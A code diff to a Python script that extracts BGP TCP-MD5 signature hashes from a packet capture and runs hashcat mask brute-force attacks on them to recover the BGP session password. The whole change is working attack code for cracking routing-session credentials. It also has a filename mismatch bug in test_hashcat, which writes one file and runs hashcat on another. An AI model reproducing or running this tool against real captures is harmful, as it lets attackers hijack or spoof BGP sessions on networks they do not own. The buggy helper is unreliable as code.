@@ -2,8 +2,8 @@ import sys, os
 import scapy.all as scapy
 from scapy.layers.inet import IP, TCP
 from scapy.contrib.bgp import *
-import struct
 from scapy.compat import raw
+import hashlib
 
 
 def IP_to_hexstring(s):
@@ -50,12 +50,36 @@ def parse_packets(packets):
                     hash_pairs.append((md5_hash, message))
     return hash_pairs
 
+def test_hashcat(password, message):
+    """Test hashcat breaking with a chosen password"""
+    file_hash = "hast_test.txt"
+    s = bytes.fromhex(message) + bytes(password, encoding='utf-8')
+    h = hashlib.md5(s).hexdigest()
+    with open("hash_test", "w") as f:
+        f.write(h + ':' + message)
+    os.system("hashcat -m 20 -a 3 --hex-salt {} ?u?l?l?l?l".format(file_hash))
+    os.remove(file_hash)
 
 
-def hashcat_command(md5_hash, message, bytes_mask=6):
-    #Add --increment for increment of length
-    c = "hashcat -m 0 -a 3 --hex-charset "  + md5_hash + " " + message + "?h" * bytes_mask
-    return c
+def hashcat_crack(md5_hash, message, mask, increment=False, increment_b=(1,9)):
+    file_hash = "hast_test.txt"
+    s = bytes.fromhex(message)
+    with open(file_hash, "w") as f:
+        f.write(md5_hash + ':' + message)
+    c = "hashcat -m 20 -a 3 --hex-salt {} {}".format(file_hash, mask)
+    if increment:
+        c += " --increment --increment-min {} --increment-max {}".format(increment_b[0], increment_b[1])
+    os.system(c)
+    os.system(c + " --show")
+    os.remove(file_hash)
+
+
+# def hashcat_command(md5_hash, message, bytes_mask=6):
+#     #Add --increment for increment of length
+#     c = "hashcat -m 0 -a 3 --hex-charset "  +  md5_hash +  " " + message + "?h" * bytes_mask
+#     return c
+
+
 if __name__ == "__main__":
     if len(sys.argv) > 1:
         input_file = sys.argv[1]
@@ -65,7 +89,9 @@ if __name__ == "__main__":
     
     packets = scapy.rdpcap(input_file)
     hash_pairs = parse_packets(packets)
-    for p in hash_pairs:
+    for p in hash_pairs[2:3]:
         h,m = p[0], p[1]
-        print(h + " " + m)
-        # print(hashcat_command(h,m,bytes_mask=7))
+        print(h,m)
+    #try to break the BGP password
+    mask = "-1 ?u?l -2 ?u?l?d ?2?2?2?2?2?2?2?2?2?2"
+    hashcat_crack(h,m,mask, increment=True, increment_b=(7,10))
